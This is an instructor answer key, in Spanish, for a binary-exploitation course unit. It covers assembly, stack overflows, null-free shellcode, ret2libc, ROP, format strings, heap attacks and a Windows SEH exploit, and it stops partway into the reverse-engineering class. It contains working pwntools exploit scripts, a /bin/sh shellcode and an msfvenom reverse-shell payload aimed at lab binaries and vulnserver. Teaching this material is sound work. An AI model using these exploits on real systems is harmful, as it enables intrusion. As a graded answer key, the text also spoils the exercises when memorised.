# Soluciones — Parte 5: Explotación de sistemas y binarios

> Estas son **claves de referencia** para el instructor y para autoevaluación. **Intenta resolver cada reto y ejercicio por tu cuenta antes de mirar aquí**: en explotación de binarios el valor está en el proceso (leer ensamblador, razonar el layout del stack, depurar con paciencia), no en copiar la respuesta. Casi siempre hay más de un camino válido; lo que sigue es una guía técnicamente correcta.
>
> Volver al índice de la parte: [../classes/parte-5-explotacion-de-sistemas-y-binarios/README.md](../classes/parte-5-explotacion-de-sistemas-y-binarios/README.md)

**Marco ético (obligatorio).** Todo lo que sigue se practica **exclusivamente** sobre binarios que tú mismo compilas en tu VM, sobre software de laboratorio pensado para ello (vulnserver), o sobre retos de plataformas que **autorizan por diseño** su explotación (pwn.college, picoCTF, ROP Emporium, pwnable.kr, HackTheBox, crackmes.one). Trabaja siempre en una **VM Linux/Windows aislada**, sin red hacia producción y con **snapshots** antes de cada experimento (imprescindible en heap, Windows y kernel). Escribir shellcode, exploits o hacer ingeniería inversa contra sistemas o software de terceros sin permiso explícito por escrito es ilegal. La divulgación de vulnerabilidades encontradas se hace de forma **coordinada y responsable**.

---

## Clase 116 — Arquitectura x86/x64 y lenguaje ensamblador

### Solución del reto verificable

Objetivo: programa NASM que calcule `(7 * 6) - 5` con registros e instrucciones aritméticas y devuelva el resultado (**37**) como código de salida; `objdump -d` debe mostrar una `imul`/`mul` y una `sub`.

Enfoque (lab propio):

1. Escribe `calc.asm`:

   ```asm
   section .text
   global _start
   _start:
       mov  rax, 7
       imul rax, 6        ; rax = 42
       sub  rax, 5        ; rax = 37
       mov  rdi, rax      ; codigo de salida
       mov  rax, 60       ; syscall exit
       syscall
   ```

2. Ensambla y enlaza: `nasm -f elf64 calc.asm -o calc.o && ld calc.o -o programa`.
3. Ejecuta y verifica el criterio: `./programa; echo $?` → imprime `37`.
4. Confirma las instrucciones exigidas: `objdump -d -M intel programa` muestra `imul rax,rax,0x6` (o `imul`) y `sub rax,0x5`.

Evidencia que cumple el criterio: salida `37` en `echo $?` y presencia de `imul`/`mul` + `sub` en el desensamblado. (Se usa `imul rax, 6`, forma con inmediato, perfectamente válida.)

### Claves de los ejercicios

1. AT&T (destino a la derecha, prefijos `%`/`$`): `mov $0x5, %eax`; `add %rax, %rbx`; `lea -0x4(%rbp), %rax`.
2. `0x00401136` en little-endian (LSB primero) = `36 11 40 00`.
3. Sustituye el cuerpo por `mov rax, 20` / `add rax, 22` (o dos inmediatos cualesquiera) → `mov rdi, rax` antes de `exit`; `echo $?` mostrará la suma (mod 256).
4. Con `-O2` el desensamblado es más corto porque el optimizador hace *constant folding* (`suma(3,4)` se resuelve en compilación a `7`) e *inlining*, eliminando la llamada y el prólogo/epílogo de `suma`.
5. Ejemplos: `je`/`jz` consultan ZF; `jne`/`jnz` consultan ZF; `jg`/`jl` consultan SF, OF y ZF; `jb`/`jae` consultan CF. Basta identificar tres saltos y su bandera.
6. Un `if (a==b)` compila típicamente a `cmp eax, ebx` seguido de `jne .else` (o `je`): el `cmp` fija las banderas y el salto condicional las lee.

---

## Clase 117 — El stack, los registros y las convenciones de llamada

### Solución del reto verificable

Objetivo: con GDB, imprimir la dirección de retorno de `triple` **sin** `backtrace`, solo con aritmética sobre `$rbp`; debe coincidir con la instrucción siguiente a `call triple` en `main`.

Enfoque (lab propio):

1. `gcc -O0 -g frame.c -o frame` y `gdb -q ./frame`.
2. `break triple` → `run`. Ya dentro de `triple`, el prólogo (`push rbp; mov rbp, rsp`) ya se ejecutó, así que `$rbp` ancla el frame.
3. La dirección de retorno está guardada en `[$rbp+8]` (justo encima del saved RBP). Imprímela: `x/gx $rbp+8` o `p/x *(unsigned long*)($rbp+8)`.
4. Contrasta: `disassemble main`, localiza `call triple` y anota la dirección de la instrucción **siguiente**.

Evidencia que cumple el criterio: el valor de `[$rbp+8]` es exactamente la dirección de la instrucción posterior a `call triple` en `main`. (Pon el breakpoint tras el prólogo; si rompes en la primerísima instrucción, la dirección de retorno aún está en `[$rsp]`, no en `[$rbp+8]`.)

### Claves de los ejercicios

1. De arriba (direcciones altas) a abajo: `[rbp+8] = ret address`, `[rbp] = saved RBP`, y la local `r` en `[rbp-8]` (8 bytes, `long`). El stack crece hacia abajo.
2. `call` empuja en el stack la dirección de retorno (RSP -= 8) y salta al destino (carga RIP). `ret` hace lo inverso: saca esa dirección del tope (`pop` a RIP, RSP += 8).
3. System V AMD64: `a`→RDI, `b`→RSI, `c`→RDX, `d`→RCX.
4. Con `-fomit-frame-pointer` desaparecen `push rbp`/`mov rbp, rsp` y `pop rbp`; las locales se referencian relativas a `RSP` en vez de `RBP`, y RBP queda libre como registro de propósito general.
5. Tamaño de un frame = `$rbp_llamador - $rbp_actual` (o diferencia de RSP entre entradas). Basta restar las dos direcciones impresas.
6. Microsoft x64: `RCX, RDX, R8, R9` (más *shadow space* de 32 bytes reservado por el llamador).

---

## Clase 118 — Debugging con GDB y pwndbg

### Solución del reto verificable

Objetivo: con `cyclic`, hallar el offset exacto (bytes) desde el inicio de `buf` hasta la dirección de retorno de `vuln`; debe coincidir con `64 + 8` y justificarse con `context`.

Enfoque (lab propio):

1. Compila el `vuln` didáctico: `gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln` (solo laboratorio).
2. En pwndbg: `cyclic 200`, `run`, y pega el patrón como entrada de `gets`.
3. Al crashear, mira el valor que llegó a RIP (o al tope del stack). Calcula: `cyclic -l 0x6161616c` (usa el valor real que veas) → devuelve el offset.
4. Justifica con `context`/`telescope $rsp`: `buf` ocupa 64 bytes, seguido de 8 bytes de saved RBP; por tanto el retorno queda a **72** bytes del inicio de `buf`.

Evidencia que cumple el criterio: `cyclic -l` reporta **72** y en `context` se ve que 64 (buffer) + 8 (saved RBP) = 72 hasta la dirección de retorno.

### Claves de los ejercicios

1. `x/8gx $rsp` (8 giant = qwords, en hex).
2. `watch buf` (o `watch *(char*)&buf`) → el programa se detiene cuando `gets` escribe sobre esa zona; observas la sobreescritura en tiempo real.
3. `search win` (pwndbg) o `search -s win` busca la cadena en las regiones mapeadas.
4. `disassemble vuln` muestra el `call` a `gets` (`call 0x... <gets@plt>`) tras cargar `buf` en RDI (`lea rax,[rbp-0x...]; mov rdi,rax`).
5. `stepi` entra en la función llamada por `call` (baja un frame); `nexti` ejecuta el `call` completo sin entrar, deteniéndose en la instrucción siguiente.
6. Un `~/.gdbinit` con, por ejemplo, `set disassembly-flavor intel`, `break main`, y alias propios; se carga automáticamente al arrancar GDB.

---

## Clase 119 — Buffer overflow en stack: teoría

### Solución del reto verificable

Objetivo: entregar un diagrama del stack frame de `vuln` con offsets numéricos exactos y la cifra de bytes hasta (sin sobrescribir aún) la dirección de retorno; el offset debe coincidir con `cyclic -l`.

Enfoque (lab propio, conceptual):

1. `disassemble vuln` en pwndbg para leer el tamaño del frame y la posición de `buf` (`lea ...,[rbp-0x40]` → `buf` empieza en `rbp-0x40`, es decir 64 bytes).
2. Diagrama (direcciones altas arriba):

   ```text
   [ ret address ]  <- rbp+8    (objetivo del exploit)
   [ saved RBP   ]  <- rbp      (8 bytes)
   [ buf[63..0]  ]  <- rbp-0x40 (64 bytes, crece hacia rbp)
   ```

3. Bytes hasta el retorno = 64 (buffer) + 8 (saved RBP) = **72**. Aún **no** se sobrescribe: se llega justo al inicio de la dirección de retorno.
4. Contrasta con el `cyclic -l` de la clase 118 (72).

Evidencia que cumple el criterio: el offset del diagrama (72) coincide con `cyclic -l`, y saved RBP (`rbp`) y ret address (`rbp+8`) están correctamente ubicados. Nota: `sub rsp, 0x50` reserva **80 bytes de frame** (buffer 64 + alineación/otras locales); el **buffer** son 64, no confundas ambos al calcular el offset.

### Claves de los ejercicios

1. `strncpy(dst, src, sizeof(dst))` puede dejar `dst` **sin terminador `\0`** si `src` es igual o más largo que `dst`; una lectura posterior con `strlen`/`printf` desbordará al buscar el nulo.
2. Buffer 32 + saved RBP 8 → offset al retorno en x64 = **40** bytes.
3. Inseguras → seguras: `gets`→`fgets`; `strcpy`→`strncpy`/`strlcpy`; `strcat`→`strncat`/`strlcat`; `sprintf`→`snprintf`; `scanf("%s")`→`scanf("%Ns")` o `fgets`.
4. DoS: el overflow corrompe memoria y provoca crash/aborto pero sin control útil (p. ej. sobrescribe datos y segfault). RCE: se controla RIP con precisión para redirigir el flujo a código/gadgets elegidos.
5. Un NOP sled amplía la "zona de aterrizaje": si la dirección exacta del shellcode es incierta, caer en cualquier `nop` del sled desliza la ejecución hasta el payload. No ayuda si NX está activo (no se ejecuta el stack) o si controlas la dirección con exactitud.
6. NX bloquea ejecutar el shellcode inyectado (datos no ejecutables); stack canary detecta la sobreescritura lineal del retorno; ASLR aleatoriza direcciones de librerías/stack; PIE aleatoriza además la base del propio ejecutable.

---

## Clase 120 — Buffer overflow en stack: explotación práctica

### Solución del reto verificable

Objetivo: `exploit.py` que, contra tu `vuln`, imprima la salida de `win()` de forma fiable en 5 ejecuciones seguidas, sin segfaults.

Enfoque (lab propio):

1. Confirma el offset (72) con `cyclic`.
2. Obtén la dirección de `win`: en pwntools `elf.symbols.win`.
3. `exploit.py`:

   ```python
   from pwn import *
   context.binary = elf = ELF("./vuln")
   p = process("./vuln")
   ret = next(elf.search(asm("ret"), executable=True))   # alineacion a 16 bytes
   payload = b"A"*72 + p64(ret) + p64(elf.symbols.win)
   p.sendline(payload)
   print(p.recvall(timeout=1).decode(errors="ignore"))
   ```

4. El gadget `ret` extra realinea `RSP` a múltiplo de 16 para evitar el crash de `movaps` dentro de funciones de libc que invoque `win()`.

Evidencia que cumple el criterio: `for i in $(seq 5); do python3 exploit.py; done` muestra el mensaje de `win()` las 5 veces. Como es `-no-pie`, la dirección de `win` es estable y el exploit es determinista.

### Claves de los ejercicios

1. En 32 bits (`-m32`): sin registros para argumentos; el offset cambia (saved EBP = 4 bytes) y se empaqueta con `p32(elf.symbols.win)`. Estructura `b"A"*offset + p32(win)`.
2. Recompila, vuelve a lanzar `cyclic`/`cyclic -l` para el nuevo offset y sustituye la constante en el script; el resto no cambia.
3. `p.recvuntil(b"prompt> ")` antes de `sendline` sincroniza con la salida del programa y evita condiciones de carrera.
4. Si `win(arg)` toma un argumento, en x64 se coloca en RDI con un gadget `pop rdi; ret` antes de la dirección de `win`; en x86 se empuja tras la dirección de retorno de `win`.
5. El gadget `ret` consume 8 bytes del stack y desplaza `RSP` en 8, corrigiendo la desalineación de 16 bytes que exige System V antes de un `call`/instrucciones SSE (`movaps`).
6. Sirve el binario con `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./vuln` y cambia `process(...)` por `remote("127.0.0.1", 1337)`.

---

## Clase 121 — Escritura de shellcode

### Solución del reto verificable

Objetivo: shellcode de 64 bits **sin bytes nulos** que lance `/bin/sh`, más el cargador C; `./loader` abre shell y el conteo de `\x00` es `0`.

Enfoque (lab propio):

1. `sh.asm` con `execve("/bin/sh", NULL, NULL)` evitando nulos (`xor` para poner a 0, `push`/`pop` para inmediatos, cadena `"/bin//sh"` de 8 bytes sin nulo):

   ```asm
   section .text
   global _start
   _start:
       xor  rsi, rsi
       push rsi
       mov  rdi, 0x68732f2f6e69622f   ; "/bin//sh"
       push rdi
       mov  rdi, rsp
       xor  rdx, rdx
       push 59
       pop  rax
       syscall
   ```

2. `nasm -f elf64 sh.asm -o sh.o && ld sh.o -o sh && ./sh` → debe abrir una shell.
3. Extrae opcodes: `objdump -d sh -M intel | grep '^ ' | cut -f2 | tr -d ' \n' | sed 's/../\\x&/g'; echo`.
4. Verifica nulos: `python3 -c 'print(b"\x48\x31...".count(b"\x00"))'` → `0`.
5. Cárgalo: `loader.c` con `char sc[] = "...";` y `((void(*)())sc)();`, compilado `gcc -z execstack -no-pie loader.c -o loader`.

Evidencia que cumple el criterio: `./loader` da shell interactiva y el conteo de `\x00` sobre los bytes es 0. (`0x68732f2f6e69622f` es `/bin//sh` en little-endian: `2f 62 69 6e 2f 2f 73 68`, 8 bytes y ningún nulo; la doble barra es inocua para el kernel.)

### Claves de los ejercicios

1. Para `/bin/ls`: cambia la cadena a `"/bin/ls\x00"` — como tiene nulo por longitud impar, se construye con `xor`/`push` o rellenando; alternativa: `execve("/bin/ls", argv, NULL)`. La mecánica de registros (RDI=ruta, RSI=argv, RDX=envp, RAX=59) es idéntica.
2. Técnica: reemplazar `mov reg, 0` por `xor reg, reg`; para inmediatos pequeños `push N; pop rax`; para cadenas, empujarlas por qwords sin nulos. Así el shellcode no contiene `\x00` que trunque un `strcpy`/`gets`.
3. El shellcode manual típico de `/bin/sh` ronda 22–30 bytes; `msfvenom -p linux/x64/exec` suele ser mayor por su codificador/opciones. Basta comparar longitudes con `len()`.
4. `exit(7)`: `xor edi,edi; mov dil,7` (o `push 7; pop rdi`), `mov al, 60; syscall`; `echo $?` → `7`.
5. `msfvenom -p linux/x64/exec CMD=id -f c` genera código que arma `execve("/bin/sh","-c","id")`; al analizarlo verás la construcción de argv en el stack.
6. Un NOP sled (`\x90...`) delante del shellcode da margen si la dirección de salto es imprecisa; aporta fiabilidad cuando no controlas la dirección exacta y no hay NX.

---

## Clase 122 — Protecciones modernas: ASLR, DEP/NX, stack canaries y PIE

### Solución del reto verificable

Objetivo: cuatro binarios del mismo fuente con distintas combinaciones de protecciones; entregar el `checksec` de cada uno y clasificar dificultad, identificando cuál tiene NX+Canary+PIE+Full RELRO.

Enfoque (lab propio):

1. Compila las variantes:

   ```bash
   gcc vuln.c -o v_full                                # defaults: NX, canary, PIE, (Full/Partial) RELRO
   gcc -fno-stack-protector vuln.c -o v_nocanary
   gcc -no-pie -fno-stack-protector vuln.c -o v_nopie
   gcc -z execstack -no-pie -fno-stack-protector vuln.c -o v_open
   ```

2. Audita: `for b in v_full v_nocanary v_nopie v_open; do echo "== $b =="; checksec --file=$b; done`.

Evidencia que cumple el criterio: `v_full` es el que muestra `NX enabled`, `Canary found`, `PIE enabled` y (según distro) `Full RELRO` → el más difícil. Orden de dificultad razonado: `v_full` > `v_nopie` (código fijo, facilita ROP) > `v_nocanary` (overflow lineal directo) > `v_open` (stack ejecutable + sin PIE/canary = shellcode directo). La debilidad residual guía el orden: PIE/ASLR se vencen con un leak; NX con ret2libc/ROP; canary con una fuga previa.

### Claves de los ejercicios

1. Tabla: **ASLR** bloquea direcciones fijas → debilidad: info leak. **NX** bloquea shellcode en stack → debilidad: reutilización de código (ret2libc/ROP). **Canary** bloquea overflow lineal del retorno → debilidad: leak del canary o escritura que lo evita. **PIE** bloquea direcciones fijas del binario → debilidad: leak de la base del ejecutable.
2. NX no impide ret2libc porque no se ejecuta ningún dato inyectado: se **reutiliza** código ya ejecutable (libc), que sí tiene permiso de ejecución.
3. En el prólogo: `mov rax, fs:0x28; mov [rbp-8], rax`; en el epílogo: `mov rax, [rbp-8]; sub rax, fs:0x28; jne __stack_chk_fail` (o `xor` + `je`). Ahí se lee y compara el canary.
4. Partial RELRO: la GOT sigue siendo escribible (solo se reordenan secciones) → atacable con sobreescritura de GOT. Full RELRO: la GOT es de **solo lectura** tras la carga → cierra esa vía.
5. Con ASLR a `2`, revisa `cat /proc/self/maps` o `ldd` en 3 corridas: la base de libc cambia cada vez.
6. PIE eleva el coste porque, aun con un leak de libc, las direcciones **del propio binario** (funciones, gadgets internos) siguen aleatorizadas; hace falta también un leak de la base del ejecutable.

---

## Clase 123 — Bypass de protecciones: ret2libc

### Solución del reto verificable

Objetivo: exploit ret2libc que abra shell interactiva contra tu binario NX (sin PIE/canary), calculando la base de libc en runtime y funcionando con ASLR **activado**.

Enfoque (lab propio):

1. `checksec ./ret2libc` → `NX enabled`, `No PIE`, `No canary`.
2. **Fase 1 (leak):** overflow que llama `puts(GOT['puts'])` y vuelve a `main`, usando `pop rdi; ret`:

   ```python
   from pwn import *
   elf = context.binary = ELF("./ret2libc")
   libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
   p = process("./ret2libc"); rop = ROP(elf)
   pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]
   p.sendline(b"A"*72 + p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.symbols["main"]))
   leak = u64(p.recvline().strip().ljust(8, b"\x00"))
   libc.address = leak - libc.symbols["puts"]
   ```

3. **Fase 2 (system):** con la base ya conocida, `system("/bin/sh")`, añadiendo un `ret` de alineación:

   ```python
   ret = rop.find_gadget(["ret"])[0]
   p.sendline(b"A"*72 + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(ret) + p64(libc.symbols["system"]))
   p.interactive()
   ```

Evidencia que cumple el criterio: `p.interactive()` da shell donde `id` responde; funciona con ASLR activo porque la base de libc se calcula desde el leak en cada corrida. Requisito: usar la **libc exacta** del sistema (los offsets dependen de la versión).

### Claves de los ejercicios

1. Filtra otra función (p. ej. `printf`) con el mismo esquema y calcula `libc.address = leak - libc.symbols["printf"]`; el resto es idéntico.
2. Sustituye la cadena por un `one_gadget` válido (`one_gadget libc.so.6` da direcciones `execve("/bin/sh")` con *constraints*): payload `b"A"*72 + p64(libc.address + og)`, cumpliendo las condiciones de registros.
3. En 32 bits no hay `pop rdi`: el argumento de `system` va **por stack**. Payload: `b"A"*off + p32(system) + p32(ret_dummy) + p32(binsh_addr)`.
4. Vuelves a `main` tras la fuga porque la primera ronda solo **imprime** la dirección; necesitas una segunda entrada al overflow, ya con la base calculada, para lanzar `system`.
5. `libc-database`: `./find puts <últimos 3 nibbles del leak>` identifica la versión; `./download` la baja para usar sus offsets exactos.
6. Con una libc de versión distinta, los offsets de `system`/`/bin/sh`/símbolos no coinciden → la base calculada es errónea y el exploit crashea o salta a basura.

---

## Clase 124 — Return-Oriented Programming (ROP)

### Solución del reto verificable

Objetivo: exploit ROP que ejecute `execve("/bin/sh", NULL, NULL)` mediante `syscall` contra tu binario estático, sin usar `system` de libc; la cadena incluye `pop rdi/rsi/rdx/rax` y un `syscall`.

Enfoque (lab propio):

1. `gcc -static -no-pie -fno-stack-protector vuln.c -o ropme` (estático = muchos gadgets).
2. Busca gadgets y la cadena: `ROPgadget --binary ropme | grep -E ": pop rdi ; ret|: pop rsi ; ret|: pop rdx ; ret|: pop rax ; ret|: syscall"` y `ROPgadget --binary ropme --string '/bin/sh'` (o escríbela en `.bss`).
3. Cadena `execve`: RDI→`"/bin/sh"`, RSI→0, RDX→0, RAX→59, luego `syscall`. Con pwntools:

   ```python
   from pwn import *
   elf = context.binary = ELF("./ropme")
   rop = ROP(elf)
   binsh = next(elf.search(b"/bin/sh"))   # o rop.write() a .bss si no existe
   rop.execve(binsh, 0, 0)
   p = process("./ropme"); p.sendline(b"A"*72 + rop.chain()); p.interactive()
   ```

Evidencia que cumple el criterio: shell interactiva; en `telescope`/`gdb.attach` se ve cada `ret` avanzando por los gadgets `pop rdi/rsi/rdx/rax` y el `syscall` final con RAX=59.

### Claves de los ejercicios

1. A mano: coloca en el stack `[pop_rdi][binsh][pop_rsi][0][pop_rdx][0][pop_rax][59][syscall]`; verifica en GDB que cada registro toma su valor antes del `syscall`.
2. `ropper --file ropme --search "pop rdi"` da resultados equivalentes a `ROPgadget`; comparar formato/cobertura.
3. Stack pivot: `leave; ret` (= `mov rsp,rbp; pop rbp; ret`) mueve `RSP` a un buffer en `.bss` previamente controlado; útil si el overflow original es corto.
4. `mprotect(addr, len, 7)`: cadena que carga RDI=dirección de página, RSI=tamaño, RDX=7 (RWX) y llama a `mprotect`, para después ejecutar shellcode ahí.
5. ROP es Turing-completo porque con gadgets suficientes puedes cargar registros, leer/escribir memoria y saltar condicionalmente (gadgets que combinan aritmética y control de flujo), reproduciendo cualquier cómputo.
6. Para 4 argumentos de syscall se necesitan 4 gadgets `pop` (RDI, RSI, RDX, y RAX para el número), más el gadget `syscall`.

---

## Clase 125 — Vulnerabilidades de format string

### Solución del reto verificable

Objetivo: exploit que, con **una sola** cadena de formato, sobrescriba una entrada de la GOT para desviar la ejecución a `win()`; mostrar en GDB la entrada GOT modificada.

Enfoque (lab propio):

1. Confirma el bug: `printf '%p %p %p %p\n' | ./fmt` imprime valores de la pila (no el texto literal).
2. Localiza el offset de tu buffer: `printf 'AAAABBBB %1$p %2$p ...\n' | ./fmt` y cuenta hasta ver `0x42424242.../0x41414141`; ese índice `N` es el offset.
3. Sobrescribe la GOT con `fmtstr_payload` (ajusta el offset al hallado):

   ```python
   from pwn import *
   elf = context.binary = ELF("./fmt")
   payload = fmtstr_payload(6, {elf.got["exit"]: elf.symbols["win"]})
   p = process("./fmt"); p.sendline(payload); print(p.recvall(timeout=1))
   ```

4. Al ejecutarse `exit()` (o la función que redirigiste), salta a `win()`.

Evidencia que cumple el criterio: se ve el mensaje de `win()` y en GDB `x/gx elf.got.exit` muestra ahora la dirección de `win`. Se apunta a `exit`/una función llamada tras el `printf` para que el desvío se dispare de forma limpia.

### Claves de los ejercicios

1. Envía `AAAA %1$p %2$p %3$p...` y localiza en qué posición aparece `0x41414141` (32 bits) o `0x...41414141` (64 bits): ese `N` es el offset del argumento controlado.
2. El canary suele aparecer en un `%N$p` concreto (valor terminado en `00` y no-puntero): recórrelo con `%p` hasta identificarlo por su forma (byte bajo nulo).
3. `fmtstr_payload(offset, {&global: 0xdeadbeef})` (o a mano con anchos `%Nc` y `%hn`) escribe el valor en la variable global.
4. `fmtstr_payload(offset, {elf.got["puts"]: elf.symbols["win"]})`: el siguiente `puts` invocará `win`.
5. El payload manual exige calcular anchos acumulados y usar `%hn`/`%hhn` por partes; `fmtstr_payload` lo automatiza y es menos propenso a errores de conteo.
6. Con `-D_FORTIFY_SOURCE=2 -O2`, `printf` con `%n` en formato **escribible** (no en `.rodata`) es rechazado en runtime (`*** %n in writable segment detected ***`), bloqueando la escritura.

---

## Clase 126 — Explotación de heap: fundamentos

### Solución del reto verificable

Objetivo: con un programa que reserve/libere varios chunks, demostrar en pwndbg que el tcache es LIFO prediciendo la dirección que devolverá el siguiente `malloc`.

Enfoque (lab propio):

1. Compila `heapdemo.c` (reserva `a`,`b` de `0x30`, `free(a); free(b)`, luego `malloc(0x30)`).
2. `break main; run`; tras los `malloc`/`free` usa `heap`, `bins`, `vis_heap_chunks`.
3. Tras `free(a); free(b)`, `bins` muestra el tcache del tamaño `0x40` con orden LIFO: la cabeza es `b` (el último liberado).
4. Predicción: el siguiente `malloc(0x30)` devolverá la dirección de **`b`** (cabeza del tcache), no la de `a`.

Evidencia que cumple el criterio: el `malloc` posterior retorna exactamente la dirección que predijiste desde `bins` (la del último `free`), confirmando el comportamiento LIFO del tcache. Recuerda: `malloc(0x30)` da un chunk de `0x40` (incluye cabecera y redondeo).

### Claves de los ejercicios

1. Dos chunks contiguos: cada uno tiene su cabecera `[prev_size][size]` (16 bytes en x64) inmediatamente antes de los datos; el `size` del segundo está justo tras el final de los datos del primero.
2. Tras liberar 3 chunks iguales, `bins` lista el tcache de ese tamaño con 3 entradas encadenadas por `next` (orden LIFO: el último arriba).
3. tcache es LIFO porque `free` inserta al **frente** de la lista y `malloc` saca del frente; implica que la memoria liberada más recientemente se reutiliza primero.
4. Un `malloc(0x420)` (> `0x408`, fuera del rango tcache) va, al liberarse, al **unsorted bin** (y de ahí a small/large según tamaño).
5. El top chunk aparece en `vis_heap_chunks` como el último, grande, con su `size` = espacio libre restante del heap.
6. El `next` de un chunk en tcache está en los **primeros 8 bytes de la zona de datos** del chunk liberado (donde antes había datos del usuario); apunta al siguiente chunk del tcache.

---

## Clase 127 — Heap: use-after-free y double free

### Solución del reto verificable

Objetivo: en un binario con UAF/double free, lograr que un `malloc` devuelva una dirección elegida mediante **tcache poisoning**.

Enfoque (lab propio / reto autorizado):

1. Reserva dos chunks del mismo tamaño; provoca el double free controlado (en glibc con `tcache key`, hace falta reciclar/falsear la clave o usar fastbin).
2. Sobrescribe el puntero `next` del chunk liberado con la dirección objetivo (`edit(idx, p64(target))`).
3. Dos `malloc` del mismo tamaño: el primero saca el chunk falso al frente; el segundo **devuelve `target`**.
4. Objetivo típico: entrada de la GOT o, en glibc antigua, `__free_hook` (eliminado en ≥2.34; en modernas se apunta a GOT/estructuras equivalentes).

Evidencia que cumple el criterio: en GDB (`vis_heap_chunks`, `bins`) se comprueba que un `malloc` retornó la dirección objetivo; si el reto lo permite, se logra ejecución (`system` en el hook) o lectura de la flag.

### Claves de los ejercicios

1. Tras `free(a)`, poner `a = NULL` elimina el puntero colgante; ASan ya no reporta `heap-use-after-free` porque no se vuelve a usar la memoria liberada.
2. El `free` devuelve el chunk al asignador; el siguiente `malloc` del mismo tamaño reutiliza esa **misma** región, de modo que el puntero viejo (`a`) y el nuevo (`b`) apuntan al mismo lugar y se solapan.
3. tcache poisoning apuntando a una variable global: escribe su dirección en el `next` y saca el chunk con dos `malloc`; el segundo devuelve la global.
4. La `tcache key` (glibc ≥2.29) es un campo en el chunk liberado igual al puntero del tcache; al liberar de nuevo, glibc detecta que la clave ya está puesta → `double free detected in tcache`.
5. En glibc moderna (≥2.34) los hooks no existen: objetivos viables son entradas GOT, `__malloc_hook`/`__free_hook` solo en versiones antiguas, `_IO_2_1_stdout_`/`stderr` (FSOP), o punteros de función en estructuras de la app.
6. ASan reporta el UAF con backtrace de asignación/liberación/uso, rápido y preciso; Valgrind (`--tool=memcheck`) también lo detecta pero es más lento y no requiere recompilar.

---

## Clase 128 — Integer overflows y errores aritméticos

### Solución del reto verificable

Objetivo: en `intov.c`, demostrar el heap overflow con ASan y luego repararlo con `__builtin_mul_overflow`, probando que el mismo `n` malicioso ya no corrompe memoria.

Enfoque (lab propio):

1. Compila con ASan: `gcc -fsanitize=address -g intov.c -o intov_asan`.
2. Ejecuta con un `n` que desborde el cálculo `n * 8` (tipo `unsigned`, 32 bits): `n = 536870912` (`0x20000000`) hace `n*8 = 2^32 → 0` truncado, así `malloc(0)` y el `memcpy` posterior desborda el heap. ASan reporta `heap-buffer-overflow`.
3. Repara:

   ```c
   unsigned size;
   if (__builtin_mul_overflow(n, 8u, &size)) return NULL;
   char *buf = malloc(size);
   ```

4. Recompila y reejecuta con el mismo `n`: la función rechaza el tamaño (`return NULL`) y ASan no reporta nada.

Evidencia que cumple el criterio: antes del fix, ASan imprime `heap-buffer-overflow`; después, el programa rechaza el tamaño y ASan queda limpio. **Nota técnica importante:** como `size` y `n` son `unsigned` (32 bits en x86 **y** x86-64), el desbordamiento ocurre igualmente en un binario nativo de 64 bits; no necesitas `-m32` para reproducirlo. Solo widening a `size_t` (64 bits) evitaría el wrap en esta plataforma.

### Claves de los ejercicios

1. `unsigned len = 0; len - 1` → `0xFFFFFFFF` (4294967295); en `size_t` (64 bits) sería `SIZE_MAX`.
2. Chequeo previo: `if (n != 0 && n > UINT_MAX / 8) return NULL;` (o directamente `__builtin_mul_overflow`) antes de `malloc(n*8)`.
3. `short s = (int)70000;` → `s` pierde los bits altos y guarda `70000 mod 65536 = 4464`; un tamaño "grande" pasa a uno pequeño.
4. `int` signed que se desborda es **UB**: el compilador puede asumir que `a+b` no desborda y optimizar mal comparaciones como `if (a+b < a)`. Con `-fsanitize=undefined` (UBSan) se detecta el overflow signed.
5. Off-by-one: `for (i = 0; i <= n; i++) buf[i] = ...` escribe `n+1` elementos (índice `n` incluido) → un byte fuera de límite; corrige a `i < n`.
6. Ejemplo: CVE de *integer overflow* en un cálculo `width*height*bpp` en un parser de imágenes → `malloc` insuficiente → heap overflow al copiar los píxeles. Resumen: entrada controlada → multiplicación que desborda → asignación pequeña → escritura desbordada.

---

## Clase 129 — Explotación en Windows: manejo de SEH

### Solución del reto verificable

Objetivo: sobre vulnserver en tu VM Windows aislada, lograr ejecución de código mediante sobreescritura de SEH y recibir una shell en el listener local; el payload usa `POP POP RET` de un módulo sin SafeSEH y un short jmp en `nSEH`.

Enfoque (VM Windows aislada + vulnserver):

1. Lanza vulnserver, conéctate y provoca el crash en el comando vulnerable (p. ej. `GMON`) con una cadena larga; en el debugger observa que la cadena SEH se sobrescribe.
2. Offset con patrón: `!mona pc 5000` → crash → `!mona findmsp` da la distancia a `nSEH` y `SEH`.
3. `POP POP RET` en módulo sin SafeSEH: `!mona seh`.
4. Payload: `[relleno][nSEH: short jmp +6 (\xeb\x06\x90\x90)][SEH: dir POP POP RET][NOPs][shellcode]`.
5. Shellcode con `msfvenom -p windows/shell_reverse_tcp LHOST=<vm> LPORT=4444 -f python` evitando badchars (`!mona bytearray`).
6. Al dispararse la excepción, el handler ejecuta `POP POP RET`, aterriza en `nSEH`, el short jmp salta al shellcode.

Evidencia que cumple el criterio: el listener (`nc -lvnp 4444` en la VM) recibe una shell de vulnserver; el `POP POP RET` procede de un módulo sin SafeSEH y `nSEH` contiene el short jmp.

### Claves de los ejercicios

1. `!mona bytearray` genera todos los bytes; se envían y se compara la memoria en el crash: donde la secuencia se rompe/altera está un badchar. Se elimina y se repite.
2. Se salta primero a `nSEH` porque `POP POP RET` devuelve la ejecución a los 4 bytes justo antes del handler (`nSEH`); desde ahí, un short jmp salva la distancia hasta el shellcode que está más adelante.
3. `!mona modules` lista los módulos con sus flags (SafeSEH/ASLR/Rebase); eliges uno con `SafeSEH: False` para el `POP POP RET`.
4. Si el espacio tras `nSEH` es escaso para el short jmp+shellcode, se usa un **egghunter** (código pequeño que busca en memoria una etiqueta que precede al shellcode colocado en otra región).
5. SEHOP valida la integridad de la cadena SEH (que el último registro apunte al handler final del sistema); tu sobreescritura rompe la cadena → habría que reconstruirla íntegra o combinar con otra técnica.
6. Para evitar un badchar concreto (`\x00`, `\x0a`) se regenera el shellcode con `msfvenom -b '\x00\x0a'` (codificador que no emita esos bytes).

---

## Clase 130 — Ingeniería inversa: introducción

### Solución del reto verificable

Objetivo: triage estático completo de un `crackme` e identificar, sin ejecutarlo, qué función compara la clave y qué API/rutina usa.

Enfoque (lab propio):

